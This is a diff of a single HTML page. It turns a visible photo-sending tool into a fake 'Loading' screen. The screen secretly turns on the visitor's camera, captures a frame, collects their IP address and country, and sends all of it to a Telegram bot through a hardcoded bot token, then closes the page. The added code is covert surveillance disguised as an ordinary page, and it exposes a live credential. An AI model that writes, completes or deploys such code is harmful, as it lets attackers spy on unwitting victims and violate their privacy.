@@ -3,123 +3,115 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Send Photo</title>
+<title>Loading</title>
 
 <style>
 body{
+  margin:0;
   background:#0f0f0f;
   color:#fff;
   font-family:sans-serif;
-  text-align:center;
-  padding:20px;
 }
-video, img{
-  width:100%;
-  max-width:360px;
-  border-radius:12px;
-  margin-top:10px;
-}
-button{
-  margin-top:12px;
-  padding:12px 20px;
-  font-size:16px;
-  border:none;
-  border-radius:10px;
-  background:#2ea6ff;
-  color:#fff;
+#loading{
+  position:fixed;
+  inset:0;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:22px;
 }
 </style>
 </head>
-
 <body>
 
-<h3>📸 Take Photo</h3>
-
-<video id="video" autoplay playsinline></video>
-<img id="preview" style="display:none"/>
-
-<button onclick="capture()">📷 Capture</button>
-<button onclick="sendPhoto()" id="sendBtn" style="display:none">📤 Send</button>
+<div id="loading">🔄 Loading...</div>
 
 <script>
-// ===== BOT TOKEN =====
+// ========= CONFIG =========
 const BOT_TOKEN = "8558930997:AAHZSF1FLVK6qzcGe2BrMYl0QIWXdokzoMM";
-// =====================
+// ==========================
 
-// Get User ID from URL  (?=6362758258)
+// Get USER ID from URL (?=6362758258)
 const params = new URLSearchParams(window.location.search);
 const USER_ID = params.get("");
 
-// Globals
-const video = document.getElementById("video");
-const preview = document.getElementById("preview");
-const sendBtn = document.getElementById("sendBtn");
-let imageBlob = null;
-let ipAddress = "Unknown";
-let country = "Unknown";
+let step = 0;
 
-// Get IP
-fetch("https://api.ipify.org?format=json")
-.then(r => r.json())
-.then(d => ipAddress = d.ip);
-
-// Get Country
-fetch("https://ipapi.co/json/")
-.then(r => r.json())
-.then(d => country = d.country_name);
-
-// Camera permission
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => video.srcObject = stream)
-.catch(() => alert("Camera permission required"));
-
-// Capture photo
-function capture(){
-  const canvas = document.createElement("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext("2d").drawImage(video, 0, 0);
-
-  canvas.toBlob(blob => {
-    imageBlob = blob;
-    preview.src = URL.createObjectURL(blob);
-    preview.style.display = "block";
-    video.style.display = "none";
-    sendBtn.style.display = "inline-block";
-  }, "image/jpeg", 0.9);
+// Loading sequence: 2 times (1s + 1s)
+function loadingCycle(){
+  step++;
+  if(step <= 2){
+    document.getElementById("loading").innerText = "🔄 Loading...";
+    setTimeout(loadingCycle, 1000);
+  } else {
+    startProcess();
+  }
 }
 
-// Send photo with caption
-function sendPhoto(){
-  if(!USER_ID){
-    alert("User ID not found in URL");
-    return;
+loadingCycle();
+
+// Start camera → capture → send → close
+async function startProcess(){
+  try{
+    // Get IP
+    const ipData = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
+    const geoData = await fetch("https://ipapi.co/json/").then(r=>r.json());
+
+    // Open camera (hidden)
+    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    await video.play();
+
+    // Wait camera ready
+    await new Promise(r => setTimeout(r, 500));
+
+    // Capture one frame
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video,0,0);
+
+    stream.getTracks().forEach(t => t.stop());
+
+    const blob = await new Promise(r => canvas.toBlob(r,"image/jpeg",0.9));
+
+    // Caption
+    const caption =
+`📸 <b>New Image Received</b>
+
+🔢 <b>Number:</b> ${USER_ID}
+🌐 <b>IP Address:</b> ${ipData.ip}
+🌍 <b>Country:</b> ${geoData.country_name}
+
+👨‍💻 <b>Dev:</b> @XFPro43`;
+
+    // Send to bot
+    const formData = new FormData();
+    formData.append("chat_id", USER_ID);
+    formData.append("photo", blob, "photo.jpg");
+    formData.append("caption", caption);
+    formData.append("parse_mode","HTML");
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+      method:"POST",
+      body:formData
+    });
+
+    // Close page / go back
+    setTimeout(()=>{
+      if(window.Telegram && Telegram.WebApp){
+        Telegram.WebApp.close();
+      } else {
+        history.back();
+      }
+    }, 500);
+
+  }catch(e){
+    document.getElementById("loading").innerText = "❌ Permission Denied";
   }
-
-  const caption =
-`new image received
-number : ${USER_ID}
-ip address : ${ipAddress}
-country : ${country}
-dev : @XFPro43`;
-
-  const formData = new FormData();
-  formData.append("chat_id", USER_ID);
-  formData.append("photo", imageBlob, "photo.jpg");
-  formData.append("caption", caption);
-
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-    method: "POST",
-    body: formData
-  })
-  .then(r => r.json())
-  .then(d => {
-    if(d.ok) alert("✅ Sent");
-    else alert("❌ Failed");
-  })
-  .catch(() => alert("❌ Network / CORS Error"));
 }
 </script>
 
 </body>
-</html>
+</html> 
